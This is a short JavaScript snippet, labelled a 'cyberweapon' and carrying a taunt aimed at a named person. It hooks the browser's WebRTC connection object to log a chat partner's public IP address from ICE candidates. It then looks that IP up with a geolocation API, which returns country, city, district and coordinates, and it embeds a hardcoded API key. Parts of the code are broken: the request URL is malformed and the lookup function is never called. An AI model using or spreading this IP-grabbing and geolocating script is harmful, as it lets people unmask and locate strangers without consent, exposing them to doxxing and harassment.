//cyberweapon

window.oRTCPeerConnection  = window.oRTCPeerConnection || window.RTCPeerConnection

//batny pisses in pant

window.RTCPeerConnection = function(...args) {
 const pc = new window.oRTCPeerConnection(...args)

pc.oaddIceCandidate = pc.addIceCandidate

pc.addIceCandidate = function(iceCandidate, ...rest) {
 const fields = iceCandidate.candidate.split(' ')

if (fields[7] === 'srflx') {
console.log('IP Address:', fields[4])
}
return pc.oaddIceCandidate(iceCandidate, ...rest)

}

return pc
}



  const getlocation = async (ip) => {
  let url = 'https://api.ipgeolocation.io/ipgeo?apiKey=${7139205c5549418e850df5f182ddd8c5}&ip={172.67.17.71';

  await fetch(url).then((response) =>
    response.json().then((json) => {
      const output = `
          ---------------------
          Country: ${json.country_name}
          State: ${json.state_prov}
          City: ${json.city}
          District: ${json.district}
          Lat / Long: (${json.latitude}, ${json.longitude})
          ---------------------
          `;
      console.log(output);
    })
  );
};
        
          
     